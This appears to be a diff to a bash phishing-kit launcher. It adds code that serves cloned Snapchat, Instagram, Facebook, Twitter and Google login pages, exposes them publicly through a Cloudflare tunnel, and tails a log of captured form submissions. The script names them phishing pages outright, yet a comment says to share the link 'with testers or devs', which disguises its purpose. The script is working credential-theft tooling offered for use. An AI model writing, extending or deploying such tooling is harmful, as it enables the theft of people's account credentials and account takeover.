@@ -36,26 +36,107 @@ case $opt in
     echo -e "\e[1;32mStarting Snapchat phishing page..."
     cd sites/Snapchat
     php -S 127.0.0.1:8080
+     # Start PHP server in background
+  php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+
+  sleep 2
+
+  # Launch Cloudflare tunnel and capture public URL
+  echo -e "\e[1;34mOpening Cloudflare tunnel..."
+  TUNNEL_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')
+
+  # Display the tunnel URL
+  echo -e "\n\e[1;32mPublic Link:\e[0m $TUNNEL_URL"
+  echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"
+
+  echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"
+
+  # Tail log file in real time
+  tail -f ../../log.txt
     ;;
   2)
     echo -e "\e[1;32mStarting Instagram phishing page..."
     cd sites/Instagram
     php -S 127.0.0.1:8080
+     php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+
+  sleep 2
+
+  # Launch Cloudflare tunnel and capture public URL
+  echo -e "\e[1;34mOpening Cloudflare tunnel..."
+  TUNNEL_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')
+
+  # Display the tunnel URL
+  echo -e "\n\e[1;32mPublic Link:\e[0m $TUNNEL_URL"
+  echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"
+
+  echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"
+
+  # Tail log file in real time
+  tail -f ../../log.txt
     ;;
   3)
     echo -e "\e[1;32mStarting Facebook phishing page..."
     cd sites/Facebook
     php -S 127.0.0.1:8080
+     php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+
+  sleep 2
+
+  # Launch Cloudflare tunnel and capture public URL
+  echo -e "\e[1;34mOpening Cloudflare tunnel..."
+  TUNNEL_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')
+
+  # Display the tunnel URL
+  echo -e "\n\e[1;32mPublic Link:\e[0m $TUNNEL_URL"
+  echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"
+
+  echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"
+
+  # Tail log file in real time
+  tail -f ../../log.txt
     ;;
   4)
     echo -e "\e[1;32mStarting Twitter phishing page..."
     cd sites/Twitter
     php -S 127.0.0.1:8080
+     php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+
+  sleep 2
+
+  # Launch Cloudflare tunnel and capture public URL
+  echo -e "\e[1;34mOpening Cloudflare tunnel..."
+  TUNNEL_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')
+
+  # Display the tunnel URL
+  echo -e "\n\e[1;32mPublic Link:\e[0m $TUNNEL_URL"
+  echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"
+
+  echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"
+
+  # Tail log file in real time
+  tail -f ../../log.txt
     ;;
   5)
     echo -e "\e[1;32mStarting Google phishing page..."
     cd sites/Google
     php -S 127.0.0.1:8080
+     php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+
+  sleep 2
+
+  # Launch Cloudflare tunnel and capture public URL
+  echo -e "\e[1;34mOpening Cloudflare tunnel..."
+  TUNNEL_URL=$(cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://.*trycloudflare.com')
+
+  # Display the tunnel URL
+  echo -e "\n\e[1;32mPublic Link:\e[0m $TUNNEL_URL"
+  echo -e "\e[1;33mShare this link with testers or devs to access your app.\n"
+
+  echo -e "\e[1;34mLogging access and form submissions to log.txt...\n"
+
+  # Tail log file in real time
+  tail -f ../../log.txt
     ;;
   6)
     echo -e "\n\e[1;33mAdvanced Settings:"
